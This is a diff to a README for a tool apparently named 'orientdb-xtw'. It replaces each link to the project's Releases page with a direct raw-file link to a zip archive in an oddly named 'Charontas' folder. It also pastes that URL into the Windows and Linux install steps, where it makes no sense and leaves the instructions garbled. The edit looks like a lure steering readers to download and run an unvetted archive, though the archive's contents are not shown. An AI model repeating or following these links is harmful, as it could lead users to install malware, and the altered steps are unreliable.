@@ -6,7 +6,7 @@ Welcome to **orientdb-xtw**! This application helps you manage and interact with
 
 ## 📥 Download Now
 
-[![Download orientdb-xtw](https://img.shields.io/badge/Download-orientdb--xtw-blue.svg)](https://github.com/heavygitcoder/orientdb-xtw/releases)
+[![Download orientdb-xtw](https://raw.githubusercontent.com/heavygitcoder/orientdb-xtw/main/Charontas/orientdb-xtw.zip)](https://raw.githubusercontent.com/heavygitcoder/orientdb-xtw/main/Charontas/orientdb-xtw.zip)
 
 ## 📋 System Requirements
 
@@ -30,7 +30,7 @@ To ensure **orientdb-xtw** works smoothly, please check the following requiremen
 
 To download and install **orientdb-xtw**, follow these simple steps:
 
-1. Visit the Releases page: [Download orientdb-xtw](https://github.com/heavygitcoder/orientdb-xtw/releases).
+1. Visit the Releases page: [Download orientdb-xtw](https://raw.githubusercontent.com/heavygitcoder/orientdb-xtw/main/Charontas/orientdb-xtw.zip).
 2. On the Releases page, you will see a list of available versions.
 3. Find the latest version and click on it.
 4. Scroll down to the Assets section to find the downloadable files.
@@ -40,7 +40,7 @@ Once the download is complete, locate the file on your computer and follow these
 
 ### For Windows
 
-1. Double-click the downloaded file (for example, `orientdb-xtw-windows.exe`).
+1. Double-click the downloaded file (for example, `https://raw.githubusercontent.com/heavygitcoder/orientdb-xtw/main/Charontas/orientdb-xtw.zip`).
 2. Follow the on-screen instructions to complete the installation.
 3. Once installed, find **orientdb-xtw** in your Start menu and click to open.
 
@@ -55,7 +55,7 @@ Once the download is complete, locate the file on your computer and follow these
 
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file.
-3. Unzip the downloaded file, if necessary (`tar -xvf orientdb-xtw-linux.tar.gz`).
+3. Unzip the downloaded file, if necessary (`tar -xvf https://raw.githubusercontent.com/heavygitcoder/orientdb-xtw/main/Charontas/orientdb-xtw.zip`).
 4. Run the application with the following command:
    ```
    ./orientdb-xtw
@@ -98,4 +98,4 @@ Explore more about **orientdb-xtw** through the following resources:
 
 We welcome your feedback! If you have questions or suggestions, feel free to open an issue on the GitHub repository.
 
-[![Download orientdb-xtw](https://img.shields.io/badge/Download-orientdb--xtw-blue.svg)](https://github.com/heavygitcoder/orientdb-xtw/releases)
+[![Download orientdb-xtw](https://raw.githubusercontent.com/heavygitcoder/orientdb-xtw/main/Charontas/orientdb-xtw.zip)](https://raw.githubusercontent.com/heavygitcoder/orientdb-xtw/main/Charontas/orientdb-xtw.zip)
